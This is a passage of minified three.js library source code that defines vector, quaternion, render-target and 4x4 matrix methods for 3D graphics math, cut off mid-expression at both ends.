this.set(1,0,0,0),this;a=Math.PI;e=(e+1)/2;h=(h+1)/2;k=(k+1)/2;d=(d+g)/4;f=(f+c)/4;m=(m+b)/4;e>h&&e>k?.01>e?(b=0,d=c=.707106781):(b=Math.sqrt(e),c=d/b,d=f/b):h>k?.01>h?(b=.707106781,c=0,d=.707106781):(c=Math.sqrt(h),\nb=d/c,d=m/c):.01>k?(c=b=.707106781,d=0):(d=Math.sqrt(k),b=f/d,c=m/d);this.set(b,c,d,a);return this}a=Math.sqrt((b-m)*(b-m)+(f-c)*(f-c)+(g-d)*(g-d));.001>Math.abs(a)&&(a=1);this.x=(b-m)/a;this.y=(f-c)/a;this.z=(g-d)/a;this.w=Math.acos((e+h+k-1)/2);return this},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);this.w=Math.min(this.w,a.w);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=Math.max(this.z,a.z);\nthis.w=Math.max(this.w,a.w);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));this.w=Math.max(a.w,Math.min(b.w,this.w));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new fa,b=new fa);a.set(c,c,c,c);b.set(d,d,d,d);return this.clamp(a,b)}}(),floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);this.z=Math.floor(this.z);this.w=Math.floor(this.w);\nreturn this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);this.w=Math.ceil(this.w);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);this.w=Math.round(this.w);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);this.w=0>this.w?Math.ceil(this.w):Math.floor(this.w);\nreturn this},negate:function(){this.x=-this.x;this.y=-this.y;this.z=-this.z;this.w=-this.w;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z+this.w*a.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length())},\nsetLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-this.z)*b;this.w+=(a.w-this.w)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z&&a.w===this.w},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];this.w=a[b+3];return this},toArray:function(a,b){void 0===a&&(a=\n[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;a[b+3]=this.w;return a},fromBufferAttribute:function(a,b,c){void 0!==c&&console.warn(\"THREE.Vector4: offset has been removed from .fromBufferAttribute().\");this.x=a.getX(b);this.y=a.getY(b);this.z=a.getZ(b);this.w=a.getW(b);return this}};Ya.prototype={constructor:Ya,isWebGLRenderTarget:!0,setSize:function(a,b){if(this.width!==a||this.height!==b)this.width=a,this.height=b,this.dispose();this.viewport.set(0,0,a,b);this.scissor.set(0,0,a,\nb)},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.width=a.width;this.height=a.height;this.viewport.copy(a.viewport);this.texture=a.texture.clone();this.depthBuffer=a.depthBuffer;this.stencilBuffer=a.stencilBuffer;this.depthTexture=a.depthTexture;return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}};Object.assign(Ya.prototype,pa.prototype);Gb.prototype=Object.create(Ya.prototype);Gb.prototype.constructor=Gb;Gb.prototype.isWebGLRenderTargetCube=!0;\nca.prototype={constructor:ca,get x(){return this._x},set x(a){this._x=a;this.onChangeCallback()},get y(){return this._y},set y(a){this._y=a;this.onChangeCallback()},get z(){return this._z},set z(a){this._z=a;this.onChangeCallback()},get w(){return this._w},set w(a){this._w=a;this.onChangeCallback()},set:function(a,b,c,d){this._x=a;this._y=b;this._z=c;this._w=d;this.onChangeCallback();return this},clone:function(){return new this.constructor(this._x,this._y,this._z,this._w)},copy:function(a){this._x=\na.x;this._y=a.y;this._z=a.z;this._w=a.w;this.onChangeCallback();return this},setFromEuler:function(a,b){if(!1===(a&&a.isEuler))throw Error(\"THREE.Quaternion: .setFromEuler() now expects an Euler rotation rather than a Vector3 and order.\");var c=Math.cos(a._x/2),d=Math.cos(a._y/2),e=Math.cos(a._z/2),f=Math.sin(a._x/2),g=Math.sin(a._y/2),h=Math.sin(a._z/2),m=a.order;\"XYZ\"===m?(this._x=f*d*e+c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"YXZ\"===m?(this._x=f*d*e+c*g*h,this._y=c*g*\ne-f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\"ZXY\"===m?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e-f*g*h):\"ZYX\"===m?(this._x=f*d*e-c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e+f*g*h):\"YZX\"===m?(this._x=f*d*e+c*g*h,this._y=c*g*e+f*d*h,this._z=c*d*h-f*g*e,this._w=c*d*e-f*g*h):\"XZY\"===m&&(this._x=f*d*e-c*g*h,this._y=c*g*e-f*d*h,this._z=c*d*h+f*g*e,this._w=c*d*e+f*g*h);if(!1!==b)this.onChangeCallback();return this},setFromAxisAngle:function(a,b){var c=\nb/2,d=Math.sin(c);this._x=a.x*d;this._y=a.y*d;this._z=a.z*d;this._w=Math.cos(c);this.onChangeCallback();return this},setFromRotationMatrix:function(a){var b=a.elements,c=b[0];a=b[4];var d=b[8],e=b[1],f=b[5],g=b[9],h=b[2],m=b[6],b=b[10],k=c+f+b;0<k?(c=.5/Math.sqrt(k+1),this._w=.25/c,this._x=(m-g)*c,this._y=(d-h)*c,this._z=(e-a)*c):c>f&&c>b?(c=2*Math.sqrt(1+c-f-b),this._w=(m-g)/c,this._x=.25*c,this._y=(a+e)/c,this._z=(d+h)/c):f>b?(c=2*Math.sqrt(1+f-c-b),this._w=(d-h)/c,this._x=(a+e)/c,this._y=.25*c,\nthis._z=(g+m)/c):(c=2*Math.sqrt(1+b-c-f),this._w=(e-a)/c,this._x=(d+h)/c,this._y=(g+m)/c,this._z=.25*c);this.onChangeCallback();return this},setFromUnitVectors:function(){var a,b;return function(c,d){void 0===a&&(a=new q);b=c.dot(d)+1;1E-6>b?(b=0,Math.abs(c.x)>Math.abs(c.z)?a.set(-c.y,c.x,0):a.set(0,-c.z,c.y)):a.crossVectors(c,d);this._x=a.x;this._y=a.y;this._z=a.z;this._w=b;return this.normalize()}}(),inverse:function(){return this.conjugate().normalize()},conjugate:function(){this._x*=-1;this._y*=\n-1;this._z*=-1;this.onChangeCallback();return this},dot:function(a){return this._x*a._x+this._y*a._y+this._z*a._z+this._w*a._w},lengthSq:function(){return this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w},length:function(){return Math.sqrt(this._x*this._x+this._y*this._y+this._z*this._z+this._w*this._w)},normalize:function(){var a=this.length();0===a?(this._z=this._y=this._x=0,this._w=1):(a=1/a,this._x*=a,this._y*=a,this._z*=a,this._w*=a);this.onChangeCallback();return this},multiply:function(a,\nb){return void 0!==b?(console.warn(\"THREE.Quaternion: .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead.\"),this.multiplyQuaternions(a,b)):this.multiplyQuaternions(this,a)},premultiply:function(a){return this.multiplyQuaternions(a,this)},multiplyQuaternions:function(a,b){var c=a._x,d=a._y,e=a._z,f=a._w,g=b._x,h=b._y,m=b._z,k=b._w;this._x=c*k+f*g+d*m-e*h;this._y=d*k+f*h+e*g-c*m;this._z=e*k+f*m+c*h-d*g;this._w=f*k-c*g-d*h-e*m;this.onChangeCallback();return this},slerp:function(a,\nb){if(0===b)return this;if(1===b)return this.copy(a);var c=this._x,d=this._y,e=this._z,f=this._w,g=f*a._w+c*a._x+d*a._y+e*a._z;0>g?(this._w=-a._w,this._x=-a._x,this._y=-a._y,this._z=-a._z,g=-g):this.copy(a);if(1<=g)return this._w=f,this._x=c,this._y=d,this._z=e,this;var h=Math.sqrt(1-g*g);if(.001>Math.abs(h))return this._w=.5*(f+this._w),this._x=.5*(c+this._x),this._y=.5*(d+this._y),this._z=.5*(e+this._z),this;var m=Math.atan2(h,g),g=Math.sin((1-b)*m)/h,h=Math.sin(b*m)/h;this._w=f*g+this._w*h;this._x=\nc*g+this._x*h;this._y=d*g+this._y*h;this._z=e*g+this._z*h;this.onChangeCallback();return this},equals:function(a){return a._x===this._x&&a._y===this._y&&a._z===this._z&&a._w===this._w},fromArray:function(a,b){void 0===b&&(b=0);this._x=a[b];this._y=a[b+1];this._z=a[b+2];this._w=a[b+3];this.onChangeCallback();return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this._x;a[b+1]=this._y;a[b+2]=this._z;a[b+3]=this._w;return a},onChange:function(a){this.onChangeCallback=a;return this},\nonChangeCallback:function(){}};Object.assign(ca,{slerp:function(a,b,c,d){return c.copy(a).slerp(b,d)},slerpFlat:function(a,b,c,d,e,f,g){var h=c[d+0],m=c[d+1],k=c[d+2];c=c[d+3];d=e[f+0];var l=e[f+1],p=e[f+2];e=e[f+3];if(c!==e||h!==d||m!==l||k!==p){f=1-g;var n=h*d+m*l+k*p+c*e,u=0<=n?1:-1,q=1-n*n;q>Number.EPSILON&&(q=Math.sqrt(q),n=Math.atan2(q,n*u),f=Math.sin(f*n)/q,g=Math.sin(g*n)/q);u*=g;h=h*f+d*u;m=m*f+l*u;k=k*f+p*u;c=c*f+e*u;f===1-g&&(g=1/Math.sqrt(h*h+m*m+k*k+c*c),h*=g,m*=g,k*=g,c*=g)}a[b]=h;a[b+\n1]=m;a[b+2]=k;a[b+3]=c}});q.prototype={constructor:q,isVector3:!0,set:function(a,b,c){this.x=a;this.y=b;this.z=c;return this},setScalar:function(a){this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;default:throw Error(\"index is out of range: \"+a);}return this},getComponent:function(a){switch(a){case 0:return this.x;\ncase 1:return this.y;case 2:return this.z;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;this.z+=a.z;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;return this},\naddVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;this.z-=a.z;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=\na.z-b.z;return this},multiply:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead.\"),this.multiplyVectors(a,b);this.x*=a.x;this.y*=a.y;this.z*=a.z;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a):this.z=this.y=this.x=0;return this},multiplyVectors:function(a,b){this.x=a.x*b.x;this.y=a.y*b.y;this.z=a.z*b.z;return this},applyEuler:function(){var a;return function(b){!1===(b&&\nb.isEuler)&&console.error(\"THREE.Vector3: .applyEuler() now expects an Euler rotation rather than a Vector3 and order.\");void 0===a&&(a=new ca);return this.applyQuaternion(a.setFromEuler(b))}}(),applyAxisAngle:function(){var a;return function(b,c){void 0===a&&(a=new ca);return this.applyQuaternion(a.setFromAxisAngle(b,c))}}(),applyMatrix3:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[3]*c+a[6]*d;this.y=a[1]*b+a[4]*c+a[7]*d;this.z=a[2]*b+a[5]*c+a[8]*d;return this},applyMatrix4:function(a){var b=\nthis.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12];this.y=a[1]*b+a[5]*c+a[9]*d+a[13];this.z=a[2]*b+a[6]*c+a[10]*d+a[14];return this.divideScalar(a[3]*b+a[7]*c+a[11]*d+a[15])},applyQuaternion:function(a){var b=this.x,c=this.y,d=this.z,e=a.x,f=a.y,g=a.z;a=a.w;var h=a*b+f*d-g*c,m=a*c+g*b-e*d,k=a*d+e*c-f*b,b=-e*b-f*c-g*d;this.x=h*a+b*-e+m*-g-k*-f;this.y=m*a+b*-f+k*-e-h*-g;this.z=k*a+b*-g+h*-f-m*-e;return this},project:function(){var a;return function(b){void 0===a&&(a=new S);a.multiplyMatrices(b.projectionMatrix,\na.getInverse(b.matrixWorld));return this.applyMatrix4(a)}}(),unproject:function(){var a;return function(b){void 0===a&&(a=new S);a.multiplyMatrices(b.matrixWorld,a.getInverse(b.projectionMatrix));return this.applyMatrix4(a)}}(),transformDirection:function(a){var b=this.x,c=this.y,d=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d;this.y=a[1]*b+a[5]*c+a[9]*d;this.z=a[2]*b+a[6]*c+a[10]*d;return this.normalize()},divide:function(a){this.x/=a.x;this.y/=a.y;this.z/=a.z;return this},divideScalar:function(a){return this.multiplyScalar(1/\na)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);this.z=Math.min(this.z,a.z);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);this.z=Math.max(this.z,a.z);return this},clamp:function(a,b){this.x=Math.max(a.x,Math.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));this.z=Math.max(a.z,Math.min(b.z,this.z));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new q,b=new q);a.set(c,c,c);b.set(d,d,d);return this.clamp(a,\nb)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);this.z=Math.floor(this.z);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);this.z=Math.ceil(this.z);return this},round:function(){this.x=Math.round(this.x);this.y=Math.round(this.y);this.z=Math.round(this.z);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);\nthis.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);this.z=0>this.z?Math.ceil(this.z):Math.floor(this.z);return this},negate:function(){this.x=-this.x;this.y=-this.y;this.z=-this.z;return this},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length())},\nsetLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-this.z)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,a).multiplyScalar(c).add(a)},cross:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector3: .cross() now only accepts one argument. Use .crossVectors( a, b ) instead.\"),this.crossVectors(a,b);var c=this.x,d=this.y,e=this.z;this.x=d*a.z-e*a.y;this.y=e*a.x-c*a.z;this.z=c*a.y-\nd*a.x;return this},crossVectors:function(a,b){var c=a.x,d=a.y,e=a.z,f=b.x,g=b.y,h=b.z;this.x=d*h-e*g;this.y=e*f-c*h;this.z=c*g-d*f;return this},projectOnVector:function(a){var b=a.dot(this)/a.lengthSq();return this.copy(a).multiplyScalar(b)},projectOnPlane:function(){var a;return function(b){void 0===a&&(a=new q);a.copy(this).projectOnVector(b);return this.sub(a)}}(),reflect:function(){var a;return function(b){void 0===a&&(a=new q);return this.sub(a.copy(b).multiplyScalar(2*this.dot(b)))}}(),angleTo:function(a){a=\nthis.dot(a)/Math.sqrt(this.lengthSq()*a.lengthSq());return Math.acos(N.clamp(a,-1,1))},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x,c=this.y-a.y;a=this.z-a.z;return b*b+c*c+a*a},distanceToManhattan:function(a){return Math.abs(this.x-a.x)+Math.abs(this.y-a.y)+Math.abs(this.z-a.z)},setFromSpherical:function(a){var b=Math.sin(a.phi)*a.radius;this.x=b*Math.sin(a.theta);this.y=Math.cos(a.phi)*a.radius;this.z=b*Math.cos(a.theta);return this},\nsetFromCylindrical:function(a){this.x=a.radius*Math.sin(a.theta);this.y=a.y;this.z=a.radius*Math.cos(a.theta);return this},setFromMatrixPosition:function(a){return this.setFromMatrixColumn(a,3)},setFromMatrixScale:function(a){var b=this.setFromMatrixColumn(a,0).length(),c=this.setFromMatrixColumn(a,1).length();a=this.setFromMatrixColumn(a,2).length();this.x=b;this.y=c;this.z=a;return this},setFromMatrixColumn:function(a,b){if(\"number\"===typeof a){console.warn(\"THREE.Vector3: setFromMatrixColumn now expects ( matrix, index ).\");\nvar c=a;a=b;b=c}return this.fromArray(a.elements,4*b)},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];this.z=a[b+2];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;a[b+2]=this.z;return a},fromBufferAttribute:function(a,b,c){void 0!==c&&console.warn(\"THREE.Vector3: offset has been removed from .fromBufferAttribute().\");this.x=a.getX(b);this.y=a.getY(b);this.z=a.getZ(b);\nreturn this}};S.prototype={constructor:S,isMatrix4:!0,set:function(a,b,c,d,e,f,g,h,m,k,l,p,n,u,q,r){var A=this.elements;A[0]=a;A[4]=b;A[8]=c;A[12]=d;A[1]=e;A[5]=f;A[9]=g;A[13]=h;A[2]=m;A[6]=k;A[10]=l;A[14]=p;A[3]=n;A[7]=u;A[11]=q;A[15]=r;return this},identity:function(){this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1);return this},clone:function(){return(new S).fromArray(this.elements)},copy:function(a){this.elements.set(a.elements);return this},copyPosition:function(a){var b=this.elements;a=a.elements;\nb[12]=a[12];b[13]=a[13];b[14]=a[14];return this},extractBasis:function(a,b,c){a.setFromMatrixColumn(this,0);b.setFromMatrixColumn(this,1);c.setFromMatrixColumn(this,2);return this},makeBasis:function(a,b,c){this.set(a.x,b.x,c.x,0,a.y,b.y,c.y,0,a.z,b.z,c.z,0,0,0,0,1);return this},extractRotation:function(){var a;return function(b){void 0===a&&(a=new q);var c=this.elements,d=b.elements,e=1/a.setFromMatrixColumn(b,0).length(),f=1/a.setFromMatrixColumn(b,1).length();b=1/a.setFromMatrixColumn(b,2).length();\nc[0]=d[0]*e;c[1]=d[1]*e;c[2]=d[2]*e;c[4]=d[4]*f;c[5]=d[5]*f;c[6]=d[6]*f;c[8]=d[8]*b;c[9]=d[9]*b;c[10]=d[10]*b;return this}}(),makeRotationFromEuler:function(a){!1===(a&&a.isEuler)&&console.error(\"THREE.Matrix: .makeRotationFromEuler() now expects a Euler rotation rather than a Vector3 and order.\");var b=this.elements,c=a.x,d=a.y,e=a.z,f=Math.cos(c),c=Math.sin(c),g=Math.cos(d),d=Math.sin(d),h=Math.cos(e),e=Math.sin(e);if(\"XYZ\"===a.order){a=f*h;var m=f*e,k=c*h,l=c*e;b[0]=g*h;b[4]=-g*e;b[8]=d;b[1]=m+\nk*d;b[5]=a-l*d;b[9]=-c*g;b[2]=l-a*d;b[6]=k+m*d;b[10]=f*g}else\"YXZ\"===a.order?(a=g*h,m=g*e,k=d*h,l=d*e,b[0]=a+l*c,b[4]=k*c-m,b[8]=f*d,b[1]=f*e,b[5]=f*h,b[9]=-c,b[2]=m*c-k,b[6]=l+a*c,b[10]=f*g):\"ZXY\"===a.order?(a=g*h,m=g*e,k=d*h,l=d*e,b[0]=a-l*c,b[4]=-f*e,b[8]=k+m*c,b[1]=m+k*c,b[5]=f*h,b[9]=l-a*c,b[2]=-f*d,b[6]=c,b[10]=f*g):\"ZYX\"===a.order?(a=f*h,m=f*e,k=c*h,l=c*e,b[0]=g*h,b[4]=k*d-m,b[8]=a*d+l,b[1]=g*e,b[5]=l*d+a,b[9]=m*d-k,b[2]=-d,b[6]=c*g,b[10]=f*g):\"YZX\"===a.order?(a=f*g,m=f*d,k=c*g,l=c*d,b[0]=\ng*h,b[4]=l-a*e,b[8]=k*e+m,b[1]=e,b[5]=f*h,b[9]=-c*h,b[2]=-d*h,b[6]=m*e+k,b[10]=a-l*e):\"XZY\"===a.order&&(a=f*g,m=f*d,k=c*g,l=c*d,b[0]=g*h,b[4]=-e,b[8]=d*h,b[1]=a*e+l,b[5]=f*h,b[9]=m*e-k,b[2]=k*e-m,b[6]=c*h,b[10]=l*e+a);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return this},makeRotationFromQuaternion:function(a){var b=this.elements,c=a.x,d=a.y,e=a.z,f=a.w,g=c+c,h=d+d,m=e+e;a=c*g;var k=c*h,c=c*m,l=d*h,d=d*m,e=e*m,g=f*g,h=f*h,f=f*m;b[0]=1-(l+e);b[4]=k-f;b[8]=c+h;b[1]=k+f;b[5]=1-(a+e);b[9]=\nd-g;b[2]=c-h;b[6]=d+g;b[10]=1-(a+l);b[3]=0;b[7]=0;b[11]=0;b[12]=0;b[13]=0;b[14]=0;b[15]=1;return this},lookAt:function(){var a,b,c;return function(d,e,f){void 0===a&&(a=new q,b=new q,c=new q);var g=this.elements;c.subVectors(d,e).normalize();0===c.lengthSq()&&(c.z=1);a.crossVectors(f,c).normalize();0===a.lengthSq()&&(c.z+=1E-4,a.crossVectors(f,c).normalize());b.crossVectors(c,a);g[0]=a.x;g[4]=b.x;g[8]=c.x;g[1]=a.y;g[5]=b.y;g[9]=c.y;g[2]=a.z;g[6]=b.z;g[10]=c.z;return this}}(),multiply:function(a,b){return void 0!==\nb?(console.warn(\"THREE.Matrix4: .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead.\"),this.multiplyMatrices(a,b)):this.multiplyMatrices(this,a)},premultiply:function(a){return this.multiplyMatrices(a,this)},multiplyMatrices:function(a,b){var c=a.elements,d=b.elements,e=this.elements,f=c[0],g=c[4],h=c[8],m=c[12],k=c[1],l=c[5],p=c[9],n=c[13],u=c[2],q=c[6],r=c[10],A=c[14],w=c[3],y=c[7],K=c[11],c=c[15],v=d[0],E=d[4],L=d[8],C=d[12],F=d[1],x=d[5],H=d[9],D=d[13],z=d[2],J=d[6],\nI=d[10],Q=d[14],M=d[3],O=d[7],P=d[11],d=d[15];e[0]=f*v+g*F+h*z+m*M;e[4]=f*E+g*x+h*J+m*O;e[8]=f*L+g*H+h*I+m*P;e[12]=f*C+g*D+h*Q+m*d;e[1]=k*v+l*F+p*z+n*M;e[5]=k*E+l*x+p*J+n*O;e[9]=k*L+l*H+p*I+n*P;e[13]=k*C+l*D+p*Q+n*d;e[2]=u*v+q*F+r*z+A*M;e[6]=u*E+q*x+r*J+A*O;e[10]=u*L+q*H+r*I+A*P;e[14]=u*C+q*D+r*Q+A*d;e[3]=w*v+y*F+K*z+c*M;e[7]=w*E+y*x+K*J+c*O;e[11]=w*L+y*H+K*I+c*P;e[15]=w*C+y*D+K*Q+c*d;return this},multiplyToArray:function(a,b,c){var d=this.elements;this.multiplyMatrices(a,b);c[0]=d[0];c[1]=d[1];c[2]=\nd[2];c[3]=d[3];c[4]=d[4];c[5]=d[5];c[6]=d[6];c[7]=d[7];c[8]=d[8];c[9]=d[9];c[10]=d[10];c[11]=d[11];c[12]=d[12];c[13]=d[13];c[14]=d[14];c[15]=d[15];return this},multiplyScalar:function(a){var b=this.elements;b[0]*=a;b[4]*=a;b[8]*=a;b[12]*=a;b[1]*=a;b[5]*=a;b[9]*=a;b[13]*=a;b[2]*=a;b[6]*=a;b[10]*=a;b[14]*=a;b[3]*=a;b[7]*=a;b[11]*=a;b[15]*=a;return this},applyToBufferAttribute:function(){var a;return function(b){void 0===a&&(a=new q);for(var c=0,d=b.count;c<d;c++)a.x=b.getX(c),a.y=b.getY(c),a.z=b.getZ(c),\na.applyMatrix4(this),b.setXYZ(c,a.x,a.y,a.z);return b}}(),determinant:function(){var a=this.elements,b=a[0],c=a[4],d=a[8],e=a[12],f=a[1],g=a[5],h=a[9],m=a[13],k=a[2],l=a[6],p=a[10],n=a[14];return a[3]*(+e*h*l-d*m*l-e*g*p+c*m*p+d*g*n-c*h*n)+a[7]*(+b*h*n-b*m*p+e*f*p-d*f*n+d*m*k-e*h*k)+a[11]*(+b*m*l-b*g*n-e*f*l+c*f*n+e*g*k-c*m*k)+a[15]*(-d*g*k-b*h*l+b*g*p+d*f*l-c*f*p+c*h*k)},transpose:function(){var a=this.elements,b;b=a[1];a[1]=a[4];a[4]=b;b=a[2];a[2]=a[8];a[8]=b;b=a[6];a[6]=a[9];a[9]=b;b=a[3];a[3]=\na[12];a[12]=b;b=a[7];a[7]=a[13];a[13]=b;b=a[11];a[11]=a[14];a[14]=b;return this},setPosition:function(a){var b=this.elements;b[12]=a.x;b[13]=a.y;b[14]=a.z;return this},getInverse:function(a,b){var c=this.elements,d=a.elements,e=d[0],f=d[1],g=d[2],h=d[3],m=d[4],k=d[5],l=d[6],p=d[7],n=d[8],u=d[9],q=d[10],r=d[11],A=d[12],w=d[13],y=d[14],d=d[15],K=u*y*p-w*q*p+w*l*r-k*y*r-u*l*d+k*q*d,v=A*q*p-n*y*p-A*l*r+m*y*r+n*l*d-m*q*d,E=n*w*p-A*u*p+A*k*r-m*w*r-n*k*d+m*u*d,L=A*u*l-n*w*l-A*k*q+m*w*q+n*k*y-m*u*y,C=e*K+\nf*v+g*E+h*L;if(0===C){if(!0===b)throw Error(\"THREE.Matrix4.getInverse(): can't invert matrix, determinant is 0\");console.warn(\"THREE.Matrix4.getInverse(): can't invert matrix, determinant is 0\");return this.identity()}C=1/C;c[0]=K*C;c[1]=(w*q*h-u*y*h-w*g*r+f*y*r+u*g*d-f*q*d)*C;c[2]=(k*y*h-w*l*h+w*g*p-f*y*p-k*g*d+f*l*d)*C;c[3]=(u*l*h-k*q*h-u*g*p+f*q*p+k*g*r-f*l*r)*C;c[4]=v*C;c[5]=(n*y*h-A*q*h+A*g*r-e*y*r-n*g*d+e*q*d)*C;c[6]=(A*l*h-m*y*h-A*g*p+e*y*p+m*g*d-e*l*d)*C;c[7]=(m*q*h-n*l*h+n*g*p-e*q*p-m*g*\nr+e*l*r)*C;c[8]=E*C;c[9]=(A*u*h-n*w*h-A*f*r+e*w*r+n*f*d-e*u*d)*C;c[10]=(m*w*h-A*k*h+A*f*p-e*w*p-m*f*d+e*k*d)*C;c[11]=(n*k*h-m*u*h-n*f*p+e*u*p+m*f*r-e*k*r)*C;c[12]=L*C;c[13]=(n*w*g-A*u*g+A*f*q-e*w*q-n*f*y+e*u*y)*C;c[14]=(A*k*g-m*w*g-A*f*l+e*w*l+m*f*y-e*k*y)*C;c[15]=(m*u*g-n*k*g+n*f*l-e*u*l-m*f*q+e*k*q)*C;return this},scale:function(a){var b=this.elements,c=a.x,d=a.y;a=a.z;b[0]*=c;b[4]*=d;b[8]*=a;b[1]*=c;b[5]*=d;b[9]*=a;b[2]*=c;b[6]*=d;b[10]*=a;b[3]*=c;b[7]*=d;b[11]*=a;return this},getMaxScaleOnAxis:function(){var a=\nthis.elements;return Math.sqrt(Math.max(a[0]*a[0]+a[1]*a[1]+a[2]*a[2],a[4]*a[4]+a[5]*a[5]+a[6]*a[6],a[8]*a[8]+a[9]*a[9]+a[10]*a[10]))},makeTranslation:function(a,b,c){this.set(1,0,0,a,0,1,0,b,0,0,1,c,0,0,0,1);return this},makeRotationX:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(1,0,0,0,0,b,-a,0,0,a,b,0,0,0,0,1);return this},makeRotationY:function(a){var b=Math.cos(a);a=Math.sin(a);this.set(b,0,a,0,0,1,0,0,-a,0,b,0,0,0,0,1);return this},makeRotationZ:function(a){var b=Math.cos(a);a=Math.sin(a);\nthis.set(b,-a,0,0,a,b,0,0,0,0,1,0,0,0,0,1);return this},makeRotationAxis:function(a,b){var c=Math.cos(b),d=Math.sin(b),e=1-c,f=a.x,g=a.y,h=a.z,m=e*f,k=e*g;this.set(m*f+c,m*g-d*h,m*h+d*g,0,m*g+d*h,k*g+c,k*h-d*f,0,m*h-d*g,k*h+d*f,e*h*h+c,0,0,0,0,1);return 